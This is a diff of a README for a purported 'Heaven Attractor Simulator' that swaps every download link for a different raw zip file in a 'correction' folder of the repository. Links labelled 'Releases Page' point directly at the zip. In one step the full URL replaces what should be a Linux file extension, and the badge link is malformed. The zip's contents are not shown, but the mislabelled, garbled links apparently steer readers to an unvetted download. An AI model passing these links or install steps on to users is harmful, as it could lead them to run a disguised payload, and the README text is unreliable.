@@ -6,7 +6,7 @@ Heaven Attractor Simulator is an engaging tool that helps you explore complex sy
 
 ## 📥 Download Link
 
-[![Download Heaven Attractor Simulator](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip%20Now-%20brighterblue)](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip)
+[![Download Heaven Attractor Simulator](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip%20Now-%20brighterblue)](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip)
 
 ## 📂 What You Need
 
@@ -18,10 +18,10 @@ Before you begin, ensure you have the following on your computer:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip).
 
 1. Once there, look for the most recent version of the software.
-2. Click on the appropriate file for your operating system (this will typically be a `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip` for Linux).
+2. Click on the appropriate file for your operating system (this will typically be a `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip` for Linux).
 3. Your download will begin automatically.
 
 ### 🛠 Installation Steps
@@ -37,7 +37,7 @@ To get started, visit this page to download: [Releases Page](https://raw.githubu
    - Drag the Heaven Attractor Simulator icon into your Applications folder.
 
 3. **Linux:**
-   - Extract the files from the downloaded `https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip`.
+   - Extract the files from the downloaded `https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip`.
    - Open a terminal and navigate to the extracted folder.
    - Run the simulator by executing `./heaven-attractor-sim`.
 
@@ -74,7 +74,7 @@ For more details on functionality, examples, and advanced features, be sure to e
 
 ## 📌 Important Reminder
 
-Keep your application updated. Regular releases provide enhancements and new features. Always check the [Releases Page](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven-attractor-sim.zip) for the latest version.
+Keep your application updated. Regular releases provide enhancements and new features. Always check the [Releases Page](https://raw.githubusercontent.com/rdxdfull/heaven-attractor-sim/main/correction/heaven_sim_attractor_3.5.zip) for the latest version.
 
 ## 🌐 Feedback
 
